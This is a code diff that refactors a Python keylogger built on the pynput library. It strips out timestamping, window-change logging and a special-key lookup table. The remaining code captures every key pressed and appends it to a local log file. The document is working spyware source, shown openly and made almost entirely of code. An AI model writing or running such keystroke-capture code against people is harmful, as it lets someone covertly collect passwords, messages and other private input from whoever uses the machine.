@@ -22,24 +22,16 @@ class KeyLogger:
     
     def log_keystroke(self, key_data):
         """Log keystroke to buffer and file"""
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        log_entry = "[{0}] {1}\n".format(timestamp, key_data)
-        
         # Add to buffer
-        self.log_buffer.append(log_entry)
+        self.log_buffer.append(key_data)
         
         # Write to file
         try:
             with open(self.log_file, 'a', encoding='utf-8') as f:
-                f.write(log_entry)
+                f.write(key_data)
                 f.flush()
         except Exception as e:
             print("Error writing to log file: {0}".format(e))
-    
-    def log_window_change(self, title):
-        """Log when user switches to a different window"""
-        self.log_keystroke("--- WINDOW CHANGED: {0} ---".format(title))
-
 
 class UnifiedKeyLogger(KeyLogger):
     """Unified keylogger using pynput"""
@@ -51,58 +43,15 @@ class UnifiedKeyLogger(KeyLogger):
     def on_press(self, key):
         """Handle key press events"""
         try:
-            # Handle different key types
             if hasattr(key, 'char') and key.char:
                 # Regular alphanumeric keys
                 self.log_keystroke(key.char)
             else:
                 # Special keys
-                key_name = self.format_special_key(key)
-                self.log_keystroke("[{0}]".format(key_name))
+                self.log_keystroke("[{0}]".format(str(key).replace('Key.', '').upper()))
                 
         except Exception as e:
             self.log_keystroke("[ERROR: {0}]".format(str(e)))
-    
-    def on_release(self, key):
-        """Handle key release events"""
-        # Can be used for tracking key combinations or states
-        pass
-    
-    def format_special_key(self, key):
-        """Format special keys for logging"""
-        key_map = {
-            keyboard.Key.enter: 'ENTER',
-            keyboard.Key.tab: 'TAB',
-            keyboard.Key.space: 'SPACE',
-            keyboard.Key.backspace: 'BACKSPACE',
-            keyboard.Key.delete: 'DELETE',
-            keyboard.Key.home: 'HOME',
-            keyboard.Key.end: 'END',
-            keyboard.Key.page_up: 'PAGE_UP',
-            keyboard.Key.page_down: 'PAGE_DOWN',
-            keyboard.Key.up: 'UP_ARROW',
-            keyboard.Key.down: 'DOWN_ARROW',
-            keyboard.Key.left: 'LEFT_ARROW',
-            keyboard.Key.right: 'RIGHT_ARROW',
-            keyboard.Key.esc: 'ESC',
-            keyboard.Key.f1: 'F1', keyboard.Key.f2: 'F2', keyboard.Key.f3: 'F3', 
-            keyboard.Key.f4: 'F4', keyboard.Key.f5: 'F5', keyboard.Key.f6: 'F6',
-            keyboard.Key.f7: 'F7', keyboard.Key.f8: 'F8', keyboard.Key.f9: 'F9',
-            keyboard.Key.f10: 'F10', keyboard.Key.f11: 'F11', keyboard.Key.f12: 'F12',
-            keyboard.Key.ctrl_l: 'CTRL_L', keyboard.Key.ctrl_r: 'CTRL_R',
-            keyboard.Key.alt_l: 'ALT_L', keyboard.Key.alt_r: 'ALT_R',
-            keyboard.Key.cmd: 'WIN', keyboard.Key.cmd_r: 'WIN_R',
-            keyboard.Key.caps_lock: 'CAPS_LOCK',
-            keyboard.Key.num_lock: 'NUM_LOCK',
-            keyboard.Key.scroll_lock: 'SCROLL_LOCK',
-            keyboard.Key.insert: 'INSERT',
-            keyboard.Key.print_screen: 'PRINT_SCREEN',
-            keyboard.Key.pause: 'PAUSE',
-            keyboard.Key.shift: 'SHIFT',
-            keyboard.Key.shift_r: 'SHIFT_R'
-        }
-        
-        return key_map.get(key, str(key).replace('Key.', '').upper())
     
     def start(self):
         """Start the keylogger"""
@@ -132,22 +81,15 @@ class UnifiedKeyLogger(KeyLogger):
         self.is_running = False
         self.log_keystroke("=== KEYLOGGER STOPPED ===")
         
-        try:
-            if self.listener:
-                self.listener.stop()
-        except:
-            pass
+        if self.listener:
+            self.listener.stop()
         
         return True
 
 
 def create_keylogger(log_file="keylog.txt"):
     """Factory function to create appropriate keylogger"""
-    try:
-        return UnifiedKeyLogger(log_file)
-    except Exception:
-        # Fallback to basic cross-platform version
-        return UnifiedKeyLogger(log_file)
+    return UnifiedKeyLogger(log_file)
 
 
 # Test the keylogger (for standalone testing)
